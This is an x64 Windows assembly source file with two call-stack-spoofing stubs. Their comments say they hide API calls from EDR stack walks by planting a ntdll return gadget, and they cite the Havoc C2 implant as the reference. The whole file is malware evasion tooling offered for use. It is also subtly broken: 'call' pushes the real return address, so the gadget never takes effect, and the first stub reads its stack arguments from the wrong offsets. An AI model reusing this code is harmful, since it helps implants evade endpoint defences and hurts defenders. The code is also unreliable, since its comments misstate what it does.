/*
 * spoofcall_asm.S — Call stack spoofing assembly stubs for x64 Windows.
 *
 * Technique:
 *   1. Save real RSP to callee-saved register r12 (avoids stack collision)
 *   2. Adjust RSP to create a fake stack frame
 *   3. Place ret gadget (from ntdll.dll) as the fake return address
 *   4. Call the target API
 *   5. EDR stack walk sees the call as originating from ntdll.dll
 *   6. Target returns to gadget → gadget returns → restore RSP from r12
 *
 * Reference: Havoc payload/Demon/src/asm/Spoof.x64.asm
 */

#if defined(_WIN64) && defined(__GNUC__)

.intel_syntax noprefix
.text

/*
 * spoof_call(retGadget, targetFn, a1, a2, a3, a4)
 *
 * Windows x64 calling convention:
 *   arg1 (retGadget)  → rcx
 *   arg2 (targetFn)   → rdx
 *   arg3 (a1)         → r8
 *   arg4 (a2)         → r9
 *   arg5 (a3)         → [rsp+0x20]
 *   arg6 (a4)         → [rsp+0x28]
 *
 * Target call convention:
 *   rcx ← a1, rdx ← a2, r8 ← a3, r9 ← a4
 *   [rsp+0x20] ← a5 (shadow), [rsp+0x28] ← a6 (shadow)
 *   Return address on stack → retGadget
 */
.globl spoof_call
spoof_call:
    push    rbp
    push    r12                     /* save callee-saved r12 */
    mov     rbp, rsp

    /* Save retGadget (rcx) and targetFn (rdx) below RSP */
    mov     qword ptr [rsp - 0x08], rcx   /* retGadget */
    mov     qword ptr [rsp - 0x10], rdx   /* targetFn */

    /* Save real RSP to r12 — cannot be overwritten by stack operations */
    mov     r12, rsp

    /* Adjust rsp for fake frame: return addr + 4 shadow + 2 args = 7 slots + padding */
    sub     rsp, 0x50

    /* Restore retGadget and targetFn */
    mov     r10, qword ptr [rbp - 0x08]   /* r10 = retGadget */
    mov     r11, qword ptr [rbp - 0x10]   /* r11 = targetFn */

    /* Set up register parameters for target call */
    mov     rcx, r8                       /* rcx = a1 */
    mov     rdx, r9                       /* rdx = a2 */
    mov     r8,  qword ptr [rbp + 0x28]   /* r8  = a3 */
    mov     r9,  qword ptr [rbp + 0x30]   /* r9  = a4 */

    /* Shadow space on fake stack (4 slots for callee — zeroed) */
    mov     qword ptr [rsp + 0x20], 0
    mov     qword ptr [rsp + 0x28], 0
    mov     qword ptr [rsp + 0x30], 0
    mov     qword ptr [rsp + 0x38], 0

    /* Fake return address → ret gadget in ntdll */
    mov     qword ptr [rsp + 0x18], r10

    /* Call the target function */
    call    r11

    /* Restore real RSP from r12 (immune to stack overwrites) */
    mov     rsp, r12
    pop     r12
    pop     rbp
    ret

/*
 * spoof_call_many(retGadget, targetFn, a1-a12)
 *
 * 12 parameters. Stack args start at arg5 ([rsp+0x20]).
 *
 * Target call convention:
 *   rcx ← a1, rdx ← a2, r8 ← a3, r9 ← a4
 *   [rsp+0x20] ← a5 ... [rsp+0x68] ← a12 (on fake stack)
 *   Return address on stack → retGadget
 */
.globl spoof_call_many
spoof_call_many:
    push    rbp
    push    r12                     /* save callee-saved r12 */
    mov     rbp, rsp

    /* Save retGadget (rcx) and targetFn (rdx) below RSP */
    mov     qword ptr [rsp - 0x08], rcx
    mov     qword ptr [rsp - 0x10], rdx

    /* Save real RSP to r12 — cannot be overwritten by stack argument writes */
    mov     r12, rsp

    /* Adjust rsp for fake frame: return addr + 12 args = 14 slots (0xB0) */
    sub     rsp, 0xB0

    /* Restore retGadget and targetFn */
    mov     r10, qword ptr [rbp - 0x08]   /* r10 = retGadget */
    mov     r11, qword ptr [rbp - 0x10]   /* r11 = targetFn */

    /* Set up register parameters for target call */
    mov     rcx, r8                       /* rcx = a1 */
    mov     rdx, r9                       /* rdx = a2 */
    mov     r8,  qword ptr [rbp + 0x38]   /* r8  = a3 */
    mov     r9,  qword ptr [rbp + 0x40]   /* r9  = a4 */

    /* Copy all stack arguments into fake frame */
    mov     rax, qword ptr [rbp + 0x48]
    mov     qword ptr [rsp + 0x20], rax   /* a5 */
    mov     rax, qword ptr [rbp + 0x50]
    mov     qword ptr [rsp + 0x28], rax   /* a6 */
    mov     rax, qword ptr [rbp + 0x58]
    mov     qword ptr [rsp + 0x30], rax   /* a7 */
    mov     rax, qword ptr [rbp + 0x60]
    mov     qword ptr [rsp + 0x38], rax   /* a8 */
    mov     rax, qword ptr [rbp + 0x68]
    mov     qword ptr [rsp + 0x40], rax   /* a9 */
    mov     rax, qword ptr [rbp + 0x70]
    mov     qword ptr [rsp + 0x48], rax   /* a10 */
    mov     rax, qword ptr [rbp + 0x78]
    mov     qword ptr [rsp + 0x50], rax   /* a11 */
    mov     rax, qword ptr [rbp + 0x80]
    mov     qword ptr [rsp + 0x58], rax   /* a12 */

    /* Fake return address */
    mov     qword ptr [rsp + 0x18], r10

    /* Call the target function */
    call    r11

    /* Restore real RSP from r12 (immune to stack overwrites) */
    mov     rsp, r12
    pop     r12
    pop     rbp
    ret

#endif
